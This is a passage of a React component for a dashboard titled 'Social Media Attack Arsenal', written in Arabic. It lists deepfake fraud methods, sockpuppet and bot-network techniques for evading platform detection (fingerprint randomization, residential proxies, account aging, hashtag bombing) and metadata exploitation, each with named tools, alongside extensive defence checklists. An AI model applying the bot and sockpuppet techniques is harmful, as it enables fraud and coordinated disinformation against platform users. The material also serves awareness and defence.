                  "Darktrace AI: ذكاء اصطناعي يتعلم 'الطبيعي' ويكتشف أي انحراف",
                  "DNS Analytics: تحليل DNS tunneling ومحاولات C2 communication",
                  "Encrypted Traffic Analysis (ETA): تحليل HTTPS دون فك التشفير",
                  "XDR Correlation: ربط EDR + NDR + Cloud + Email في منصة واحدة",
                ],
              },
            ].map((sys, i) => (
              <motion.div key={sys.id} initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.08 }}
                className="rounded-2xl border p-4 space-y-3" style={{ borderColor: sys.color + "30", background: "rgba(0,0,0,0.8)" }}>
                <div className="flex items-start gap-2">
                  <div className="w-8 h-8 rounded-xl flex items-center justify-center flex-shrink-0"
                    style={{ background: sys.color + "20", border: `1px solid ${sys.color}35` }}>
                    <Monitor size={13} style={{ color: sys.color }} />
                  </div>
                  <div>
                    <div className="text-[10px] font-bold font-mono text-white">{sys.name}</div>
                  </div>
                </div>
                <p className="text-[9px] font-mono text-gray-400 leading-relaxed">{sys.desc}</p>
                <div className="space-y-1">
                  {sys.capabilities.map((c, ci) => (
                    <div key={ci} className="flex items-start gap-1.5 text-[9px] font-mono">
                      <span style={{ color: sys.color }} className="flex-shrink-0 mt-0.5">▸</span>
                      <span className="text-gray-300">{c}</span>
                    </div>
                  ))}
                </div>
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1 tracking-widest">PLATFORMS</div>
                  <div className="flex flex-wrap gap-1">
                    {sys.platforms.map(p => (
                      <span key={p} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
                        style={{ background: sys.color + "15", color: sys.color, border: `1px solid ${sys.color}25` }}>{p}</span>
                    ))}
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      );

      case "deepfake": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            تقنيات التزييف العميق — الصوت والوجه والصور الاصطناعية وتأثيرها على الأمن والمصداقية
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              {
                id: "voice", name: "الصوت الاصطناعي (Voice Cloning)", color: "#ec4899",
                desc: "محاكاة صوت أي شخص من 3 ثوانٍ من التسجيل — استخدام في الاحتيال والتصيد الصوتي",
                tools: ["ElevenLabs", "Eleven.ai", "Resemble.ai", "Coqui TTS", "Real-Time-Voice-Cloning (OS)", "RVC (Retrieval Voice Conversion)"],
                useCases: [
                  "Vishing المتقدم: مكالمة 'مدير' الضحية يطلب تحويلاً مالياً عاجلاً",
                  "25 مليون دولار سُرقت من موظف مالي في هونج كونج 2024 عبر مكالمة مزيفة",
                  "انتحال شخصية أفراد العائلة لطلب مساعدة مالية طارئة",
                  "تجاوز أنظمة التحقق الصوتي في البنوك والمؤسسات",
                ],
                defense: ["كلمة سر لحالات الطوارئ مع الأسرة", "اتصل على الرقم المعروف للتحقق", "أنظمة كشف صوت مزيف في call centers"],
              },
              {
                id: "face", name: "تزييف الوجوه (Face Swap / Deepfake Video)", color: "#f97316",
                desc: "دمج وجه أي شخص في مقاطع فيديو أخرى بواقعية شبه كاملة",
                tools: ["DeepFaceLab", "Roop", "SimSwap", "FaceSwap (OS)", "HeyGen", "Synthesia", "D-ID"],
                useCases: [
                  "انتحال شخصية مسؤولين في مؤتمرات Zoom لتمرير قرارات احتيالية",
                  "محتوى إباحي مزيف (NCII) للابتزاز وتشويه السمعة",
                  "إنتاج أدلة مزيفة في نزاعات قانونية ومحاكم",
                  "تزوير خطابات سياسية وتصريحات مسؤولين",
                ],
                defense: ["Deepfake detection tools: Deepware, Microsoft Video Authenticator", "تحقق من مصدر الفيديو الأصلي", "ابحث عن تلاشي حواف الوجه أو وميض العيون"],
              },
              {
                id: "synthetic_images", name: "الصور الاصطناعية (Synthetic Faces)", color: "#8b5cf6",
                desc: "إنشاء صور واقعية تماماً لأشخاص غير موجودين — لبناء هويات وهمية",
                tools: ["ThisPersonDoesNotExist.com", "Stable Diffusion", "DALL-E 3", "Midjourney", "StyleGAN3", "InsightFace"],
                useCases: [
                  "إنشاء حسابات وهمية بصور واقعية للتجسس والـ Catfishing",
                  "بناء شبكات من 'خبراء' وهميين للتأثير على الرأي العام",
                  "تجاوز نظام KYC في منصات مالية بوثائق وهمية",
                  "حملات تأثير مركبة بمئات الأشخاص الوهميين",
                ],
                defense: ["FotoForensics: كشف التلاعب بالصور", "تحقق من EXIF: صور AI لا تملك metadata", "Reverse image search: ابحث عن الصورة أولاً"],
              },
              {
                id: "rt_deepfake", name: "Deepfake في الوقت الفعلي (Real-Time)", color: "#e21227",
                desc: "تحويل وجه وصوت في الوقت الفعلي أثناء مكالمات الفيديو — الجيل القادم من الاحتيال",
                tools: ["Avatarify", "Deep Live Cam", "FaceFusion (RT)", "Voice Changer RT", "Morphcast", "Wav2Lip (RT)"],
                useCases: [
                  "انتحال شخصية المدير التنفيذي في مكالمات Zoom مع موظفين",
                  "تجاوز أنظمة liveness detection في بنوك والحكومات",
                  "مقابلات عمل عن بُعد بوجه مستعار (تم توثيقه من FBI)",
                  "Sextortion: تسجيل المكالمة ثم الابتزاز بمحتوى محرّف",
                ],
                defense: ["اطلب من الشخص تحريك أصبع أمام الوجه", "أنظمة liveness detection متعددة", "In-person verification للقرارات الحساسة"],
              },
            ].map((df, i) => (
              <motion.div key={df.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.08 }}
                className="rounded-2xl border p-4 space-y-3" style={{ borderColor: df.color + "30", background: "rgba(0,0,0,0.8)" }}>
                <div className="text-[10px] font-bold font-mono text-white">{df.name}</div>
                <p className="text-[9px] font-mono text-gray-400 leading-relaxed">{df.desc}</p>
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1.5 tracking-widest">USE CASES</div>
                  <div className="space-y-1">
                    {df.useCases.map((u, ui) => (
                      <div key={ui} className="flex items-start gap-1.5 text-[9px] font-mono">
                        <span style={{ color: df.color }} className="flex-shrink-0 mt-0.5">▸</span>
                        <span className="text-gray-300">{u}</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1.5 tracking-widest">TOOLS</div>
                  <div className="flex flex-wrap gap-1">
                    {df.tools.map(t => (
                      <span key={t} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
                        style={{ background: df.color + "18", color: df.color, border: `1px solid ${df.color}30` }}>{t}</span>
                    ))}
                  </div>
                </div>
                <div className="space-y-1 pt-1 border-t" style={{ borderColor: "#10b98120" }}>
                  {df.defense.map((d, di) => (
                    <div key={di} className="flex items-center gap-1.5 text-[9px] font-mono text-emerald-400">
                      <Shield size={8} className="flex-shrink-0" />{d}
                    </div>
                  ))}
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      );

      case "bots": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            البوتات والأتمتة — شبكات الحسابات الوهمية، التضخيم الاصطناعي، محاكاة السلوك البشري
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              {
                id: "human_bots", name: "البوتات المتقدمة (Human-like Bots)", color: "#22d3ee",
                desc: "بوتات تحاكي السلوك البشري بدقة لتجاوز أنظمة الكشف في منصات التواصل",
                techniques: [
                  "Random delays بين الإجراءات (1-5 ثوانٍ عشوائية)",
                  "Mouse movement simulation: حركة فأرة طبيعية لا آلية",
                  "Browser fingerprint randomization: بصمة متصفح جديدة لكل حساب",
                  "Residential proxy rotation: IPs منازل حقيقية لا datacenter",
                  "Activity patterns: نشاط خلال ساعات محددة + نوم + عطلات",
                  "Content variation: تعديل المحتوى في كل تغريدة/منشور",
                ],
                tools: ["Selenium + undetected-chromedriver", "Playwright", "Puppeteer-stealth", "BotRight", "TweetAttacksPro"],
              },
              {
                id: "fake_networks", name: "الشبكات الاجتماعية المزيفة (Sockpuppet Networks)", color: "#a855f7",
                desc: "إنشاء وإدارة شبكات من آلاف الحسابات الوهمية للتأثير على الرأي العام",
                techniques: [
                  "Account aging: حسابات عمرها سنوات تبدو حقيقية وبها تاريخ",
                  "Profile pictures: صور AI Synthetic من thisPersonDoesNotExist.com",
                  "Cross-platform presence: نفس الشخص الوهمي على Twitter/Facebook/Reddit",
                  "Social proof building: تفاعل الحسابات مع بعضها لبناء مصداقية",
                  "Nesting: حسابات تتابع حسابات أخرى لتبدو نشطة في مجتمع",
                  "Coordinated Inauthentic Behavior (CIB): تنسيق سري لنشر روايات",
                ],
                tools: ["Jarvee", "Follow Liker", "MassPlanner", "TweetAttacksPro", "SocialGhost"],
              },
              {
                id: "amplification", name: "التضخيم الاصطناعي (Artificial Amplification)", color: "#f59e0b",
                desc: "تضخيم محتوى معين ليتصدر Trending ويُكسب انتشاراً حقيقياً من خلال تفاعل اصطناعي",
                techniques: [
                  "Coordinated liking/retweeting: آلاف التفاعلات في دقائق",
                  "Hashtag bombing: دفع هاشتاق لـ Trending بتكراره آلاف المرات",
                  "Reply brigading: ملء التعليقات لإغراق الصوت المعارض",
                  "Engagement pods: مجموعات سرية تتفاعل مع بعضها آلياً",
                  "View farming: مشاهدات مزيفة لرفع الفيديو في الخوارزمية",
                  "Cross-platform seeding: نشر على Reddit ثم Twitter ثم Facebook",
                ],
                tools: ["Botnets", "Click farms", "Social media automation APIs", "Custom Python bots"],
              },
              {
                id: "metadata_exploit", name: "استغلال البيانات الوصفية (Metadata Exploitation)", color: "#10b981",
                desc: "استخراج معلومات حساسة من البيانات الوصفية للصور والملفات المشاركة على الإنترنت",
                techniques: [
                  "EXIF GPS: إحداثيات دقيقة من صور iPhone/Android قبل تجريدها",
                  "Timestamp Analysis: وقت الالتقاط الحقيقي لتحديد الروتين اليومي",
                  "Device Fingerprinting: موديل الهاتف ورقم التسلسل من صور HEIC",
                  "Document metadata: اسم المستخدم ووقت التحرير من ملفات Word/PDF",
                  "Pattern recognition: ربط نمط النشر بالمنطقة الزمنية والموقع",
                  "Cross-platform correlation: ربط حسابات متعددة عبر metadata مشتركة",
                ],
                tools: ["ExifTool", "Metagoofil", "FOCA", "Jeffrey's Exif Viewer", "MetaData2Go"],
              },
            ].map((b, i) => (
              <motion.div key={b.id} initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.08 }}
                className="rounded-2xl border p-4 space-y-3" style={{ borderColor: b.color + "30", background: "rgba(0,0,0,0.8)" }}>
                <div className="text-[10px] font-bold font-mono text-white">{b.name}</div>
                <p className="text-[9px] font-mono text-gray-400 leading-relaxed">{b.desc}</p>
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1.5 tracking-widest">TECHNIQUES</div>
                  <div className="space-y-1">
                    {b.techniques.map((t, ti) => (
                      <div key={ti} className="flex items-start gap-1.5 text-[9px] font-mono">
                        <span style={{ color: b.color }} className="flex-shrink-0 mt-0.5">▸</span>
                        <span className="text-gray-300">{t}</span>
                      </div>
                    ))}
                  </div>
                </div>
                <div>
                  <div className="text-[8px] font-mono text-gray-600 mb-1 tracking-widest">TOOLS</div>
                  <div className="flex flex-wrap gap-1">
                    {b.tools.map(t => (
                      <span key={t} className="text-[8px] font-mono px-1.5 py-0.5 rounded"
                        style={{ background: b.color + "18", color: b.color, border: `1px solid ${b.color}30` }}>{t}</span>
                    ))}
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      );

      case "defense": return (
        <div className="space-y-4">
          <div className="text-[10px] font-mono text-gray-500 mb-1">
            استراتيجيات الحماية الشاملة — للأفراد والمؤسسات ضد جميع هجمات وسائل التواصل الاجتماعي
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              {
                id: "individual", name: "الحماية الفردية — قائمة مرجعية", color: "#10b981",
                items: [
                  { label: "المصادقة الثنائية (2FA)", detail: "فعّل 2FA على جميع حساباتك — أفضل استخدام Authenticator App لا SMS" },
                  { label: "مدير كلمات مرور", detail: "استخدم Bitwarden أو 1Password — كلمة مرور فريدة لكل موقع (+16 حرف)" },
                  { label: "التحقق من الروابط", detail: "لا تنقر على أي رابط مشبوه — تحقق من URL قبل إدخال أي بيانات" },
                  { label: "مراجعة الأذونات", detail: "راجع التطبيقات المرتبطة بحساباتك وأزل غير الضروري شهرياً" },
                  { label: "Hardware Security Key", detail: "YubiKey/SoloKeys لـ 2FA لا يمكن phishing مفاتيحها" },
                  { label: "حماية البيانات الوصفية", detail: "أزل EXIF من الصور قبل نشرها — تطبيق Scrambled Exif على Android" },
                  { label: "خصوصية الملف الشخصي", detail: "اجعل حسابك خاصاً — لا تنشر معلومات يمكن استخدامها في OSINT" },
                  { label: "Passkeys", detail: "فعّل Passkeys حيثما أمكن — أقوى من 2FA ضد جميع هجمات التصيد" },
                ],
              },
              {
                id: "enterprise", name: "الحماية المؤسسية — الطبقات الدفاعية", color: "#22d3ee",
                items: [
                  { label: "Zero Trust Architecture", detail: "لا ثقة ضمنية — تحقق من كل مستخدم وجهاز في كل طلب وصول" },
                  { label: "Security Awareness Training", detail: "تدريب منتظم للموظفين + phishing simulations + KPIs قابلة للقياس" },
                  { label: "Email Security", detail: "SPF + DKIM + DMARC صارم + anti-phishing filters + sandboxing" },
                  { label: "SIEM + SOAR", detail: "مراقبة مستمرة + استجابة تلقائية — MTTD أقل من 30 دقيقة" },
                  { label: "Endpoint Protection (EDR)", detail: "CrowdStrike/SentinelOne على كل جهاز + Threat Hunting استباقي" },
                  { label: "Social Media Policy", detail: "سياسة واضحة لاستخدام وسائل التواصل + Brand monitoring مستمر" },
                  { label: "Threat Intelligence", detail: "اشتراك في TI feeds + مراقبة Dark Web للبيانات المسربة" },
                  { label: "Incident Response Plan", detail: "خطة استجابة موثقة + تدريبات Tabletop exercises ربع سنوية" },
                ],
              },
              {
                id: "osint_defense", name: "الحماية ضد OSINT — تقليص سطح الهجوم", color: "#a855f7",
                items: [
                  { label: "Google Yourself", detail: "ابحث عن اسمك + بريدك — ستعرف ما يعرفه المهاجم عنك" },
                  { label: "تنظيف البيانات القديمة", detail: "احذف حسابات قديمة + طلب حذف من data brokers (Spokeo, Whitepages)" },
                  { label: "Privacy Settings", detail: "راجع إعدادات الخصوصية في كل منصة — من يرى ماذا؟" },
                  { label: "اسم مستخدم مختلف", detail: "استخدم أسماء مستخدمين مختلفة على منصات مختلفة — أصعب correlation" },
                  { label: "VPN + Tor", detail: "استخدم VPN موثوقاً (Mullvad/ProtonVPN) + Tor للمهام الحساسة" },
                  { label: "Compartmentalization", detail: "افصل هويتك المهنية عن الشخصية عبر الإنترنت" },
                ],
              },
              {
                id: "detection", name: "الكشف المبكر — علامات التحذير", color: "#f59e0b",
                items: [
                  { label: "تنبيهات Google Alerts", detail: "اشترك لتنبيهات باسمك + شركتك + نطاقك — اعرف متى يذكرك أحد" },
                  { label: "HaveIBeenPwned", detail: "راقب haveibeenpwned.com لمعرفة تسريب بريدك/كلمات مرورك" },
                  { label: "Login notifications", detail: "فعّل إشعارات تسجيل الدخول — اعرف من يصل لحسابك ومن أين" },
                  { label: "مراجعة Authorized Apps", detail: "راجع شهرياً التطبيقات التي تصل لحساباتك — أزل المشبوهة فوراً" },
                  { label: "Brand Monitoring", detail: "راقب ذكر علامتك التجارية + أي نطاق مشابه (Typosquatting)" },
                  { label: "Dark Web Monitoring", detail: "خدمات مثل Flare.io أو SpyCloud تراقب Dark Web لبياناتك" },
                ],
              },
            ].map((def, i) => (
              <motion.div key={def.id} initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: i * 0.08 }}
                className="rounded-2xl border p-4 space-y-3" style={{ borderColor: def.color + "30", background: "rgba(0,0,0,0.8)" }}>
                <div className="text-[10px] font-bold font-mono text-white">{def.name}</div>
                <div className="space-y-2">
                  {def.items.map((item, ii) => (
                    <div key={ii} className="p-2 rounded-lg space-y-0.5" style={{ background: def.color + "08" }}>
                      <div className="flex items-center gap-1.5">
                        <Shield size={8} style={{ color: def.color }} />
                        <span className="text-[9px] font-bold font-mono text-white">{item.label}</span>
                      </div>
                      <div className="text-[8px] font-mono text-gray-400 pl-3.5">{item.detail}</div>
                    </div>
                  ))}
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      );

      case "terminal": return <HackTerminal />;
      default: return <OverviewSection />;
    }
  };

  return (
    <AnimatePresence>
      {booted && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          className="relative min-h-full bg-black overflow-hidden"
          style={{ filter: glitch ? "hue-rotate(15deg) brightness(1.1)" : "none", transition: "filter 0.06s" }}>
          <div className="absolute inset-0 pointer-events-none">
            <NetworkCanvas3D color={cur.color} density={50} speed={0.9} />
          </div>
          <div className="absolute inset-0 pointer-events-none"
            style={{ background: `radial-gradient(ellipse at 50% 0%, ${cur.color}05 0%, transparent 55%)` }} />

          <div className="relative z-10 flex flex-col h-full">
            {/* Header */}
            <div className="px-4 py-3 border-b flex-shrink-0"
              style={{ borderColor: "rgba(226,18,39,0.2)", background: "rgba(0,0,0,0.88)", backdropFilter: "blur(24px)" }}>
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 rounded-xl flex items-center justify-center"
                    style={{ background: "rgba(226,18,39,0.15)", border: "1px solid rgba(226,18,39,0.3)" }}>
                    <Crosshair size={18} className="text-red-400" />
                  </div>
                  <div>
                    <h1 className="text-sm font-bold font-mono text-white tracking-wider">SOCIAL MEDIA ATTACK ARSENAL — COMPLETE EDITION</h1>
                    <div className="text-[9px] font-mono text-red-400 tracking-[0.15em]">
                      {FRAMEWORKS.length} أطر · {OSINT_TOOLS.length} OSINT · {ATTACK_VECTORS.length} هجمات · {SUPPORT_TOOLS.length} أدوات داعمة
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <div className="flex items-center gap-1.5 px-2 py-1 rounded-lg text-[9px] font-mono"
                    style={{ background: "#10b98115", border: "1px solid #10b98130", color: "#10b981" }}>
                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                    LIVE
                  </div>
                  {onClose && (
                    <button onClick={onClose} className="w-7 h-7 flex items-center justify-center rounded-lg text-gray-500 hover:text-white hover:bg-white/5 transition-all">
                      <X size={14} />
                    </button>
                  )}
                </div>
              </div>
              {/* Nav tabs */}
              <div className="flex gap-1 overflow-x-auto pb-0.5" style={{ scrollbarWidth: "none" }}>
                {SECTIONS.map(s => (
                  <button key={s.id} onClick={() => setSection(s.id)}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-mono font-bold whitespace-nowrap flex-shrink-0 transition-all"
                    style={section === s.id ? {
                      background: s.color + "20", color: s.color,
                      border: `1px solid ${s.color}40`, boxShadow: `0 0 10px ${s.color}20`,
                    } : { background: "transparent", color: "#6b7280", border: "1px solid transparent" }}>
                    <span>{s.icon}</span> {s.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Content */}
            <div className="flex-1 overflow-y-auto p-4">
              <AnimatePresence mode="wait">
                <motion.div key={section} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -8 }} transition={{ duration: 0.18 }}>
                  {renderSection()}
                </motion.div>
              </AnimatePresence>
            </div>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
